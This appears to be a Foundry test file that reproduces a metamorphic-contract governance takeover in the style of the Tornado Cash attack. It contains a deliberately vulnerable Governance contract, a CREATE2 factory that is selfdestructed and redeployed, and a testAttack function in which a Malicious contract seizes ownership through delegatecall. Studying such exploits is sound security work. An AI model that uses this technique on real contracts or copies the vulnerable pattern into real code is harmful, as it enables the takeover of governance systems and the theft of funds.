//SPDX-License-Identifier: MIT
pragma solidity >=0.8.7;
import "forge-std/Test.sol";

contract Governance {
    address public Owner;
    mapping(address => bool) public ProposalApproval;
    mapping(address => bool) public members;
    mapping(uint256 => address) public Proposals;
    mapping(address => uint256) public votes;
    uint256 id;

    constructor() {
        Owner = msg.sender;
    }

    modifier onlyGOV() {
        require(msg.sender == Owner);
        _;
    }
    modifier onlyFans() {
        require(members[msg.sender] == true);
        _;
    }

    function setVotingMembers(address _addr) external onlyGOV {
        members[_addr] = true;
    }

    function AllowProposalToVote(address _proposal) external onlyGOV {
        uint256 _id = id;
        Proposals[_id] = _proposal;
        id++;
    }

    function set(address _addr) external onlyGOV {
        if (votes[_addr] > 2) {
            ProposalApproval[_addr] = true;
        }
    }

    function vote(uint256 _id) external onlyFans {
        address a = Proposals[_id];
        require(a != address(0));
        votes[a] += 1;
    }

    function implementation(address _imp) external {
        if (!ProposalApproval[_imp]) {
            revert("noooooooooo");
        }
        (bool s, ) = _imp.delegatecall(abi.encodeWithSignature("uwuw()"));
        require(s);
    }
}

contract Proposal {
    event Good(string indexed);

    function uwuw() external {
        emit Good("Hello World");
    }

    function sayonara() external payable {
        selfdestruct(payable(address(0)));
    }
}

contract Malicious {
    event BAD(string);
    address public Owner;

    function uwuw() external {
        emit BAD(unicode"HAHAAAðŸ˜ˆ");
        Owner = msg.sender;
    }

    // function sayonara() external payable {
    //     selfdestruct(payable(address(0)));
    // }
}

contract Factory {
    function deploy_Proposal() external returns (address) {
        address propo = address(new Proposal());
        return propo;
    }

    function deploy_Malicious() external returns (address) {
        address mali = address(new Malicious());
        return mali;
    }

    function sayonara() external payable {
        selfdestruct(payable(address(0)));
    }
}

contract DeployFactory {
    function factory_Deploy() external returns (address) {
        bytes32 _salt = keccak256(abi.encode("uwuw"));
        address FACTORY = address(new Factory{salt: _salt}());
        return FACTORY;
    }
}

contract TestTonado is Test {
    address attacker;
    address governer;
    address member1 = address(1);
    address member2 = address(2);
    address member3 = address(3);
    //===========================4
    Governance governance;
    DeployFactory deployFactory;
    Factory factory;
    Proposal pro;

    //============
    function setUp() public {
        attacker = makeAddr("attacker");
        governer = makeAddr("Governer");
        // Governer deploys  Governance
        vm.startPrank(governer);
        governance = new Governance();
        console.log("GOV Owner Before : %s", governance.Owner());
        governance.setVotingMembers(member1);
        governance.setVotingMembers(member2);
        governance.setVotingMembers(member3);
        vm.stopPrank();
        //===========================
        vm.startPrank(attacker);
        deployFactory = new DeployFactory();
        address fac = deployFactory.factory_Deploy();
        console.log("ADDRESS Factory : %s", address(fac));
        factory = Factory(fac);
        address propo = factory.deploy_Proposal();
        console.log("ADDRESS Propo : %s", address(propo));
        vm.stopPrank();
        //===============================

        vm.startPrank(governer);
        governance.AllowProposalToVote(propo);
        vm.stopPrank();
        memberVote(member1, 0);
        memberVote(member2, 0);
        memberVote(member3, 0);
        vm.startPrank(governer);
        governance.set(propo);
        vm.stopPrank();
        //===
        vm.startPrank(attacker);
        pro = Proposal(propo);
        pro.sayonara();
        factory.sayonara();
        vm.stopPrank();
    }

    function testAttack() external {
        vm.startPrank(attacker);
        deployFactory.factory_Deploy();
        address m = factory.deploy_Malicious();
        governance.implementation(m);
        console.log("GOV Owner After : %s", governance.Owner());
        console.log("Attacker Address : %s", attacker);
        vm.stopPrank();
    }

    function memberVote(address _mem, uint256 _id) internal {
        vm.startPrank(_mem);
        governance.vote(_id);
        console.log(unicode"\n Member ðŸ˜Ž Voted!", _mem);
        vm.stopPrank();
    }
}
